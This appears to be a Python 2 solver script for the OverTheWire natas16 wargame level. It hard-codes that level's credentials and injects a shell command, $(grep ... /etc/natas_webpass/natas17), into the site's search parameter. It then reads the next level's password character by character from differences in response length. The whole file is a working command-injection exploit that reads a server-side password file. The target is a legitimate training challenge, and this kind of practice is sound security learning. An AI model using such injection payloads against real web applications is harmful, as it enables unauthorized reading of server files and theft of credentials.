#!/usr/bin/python

import os, socket, sys, re, urllib2

#ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
charSet = "?HBzt?ljtPAgmaYvNfZ?chZVq??oepsx"
#charSet = "0123456789"
nums = [1,6,20,26,27]
pwLength = 32


passman = urllib2.HTTPPasswordMgr()
passman.add_password("Authentication required","http://natas16.natas.labs.overthewire.org/", "natas16", "3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L")
auth = urllib2.HTTPBasicAuthHandler(passman)
opener = urllib2.build_opener(auth)
urllib2.install_opener(opener)

#use RE for "This user doesn't exist." or "This user exists."
i=0
flag = ""

for i in charSet:
	if i != '?':
		url = "http://natas16.natas.labs.overthewire.org/?needle=$(grep%20"+i+"%20/etc/natas_webpass/natas17)&submit=Search"
		page = urllib2.urlopen(url)
		resp = page.read()
	
		url2 = "http://natas16.natas.labs.overthewire.org/?needle=$(grep%20"+i.upper()+"%20/etc/natas_webpass/natas17)&submit=Search"
		page2 = urllib2.urlopen(url2)
		resp2 = page2.read()

		if (len(resp) < 474) and (len(resp2) < 474):
			flag += '['+i+i.upper()+']'
		elif len(resp) > 473:
			flag += i.upper()
		else:
			flag += i
		#print "Length of char: " +i+" "+ str(len(resp))
		#print "Length of char: " +i.upper()+" "+ str(len(resp2))

	else:
		flag += '?'

	print flag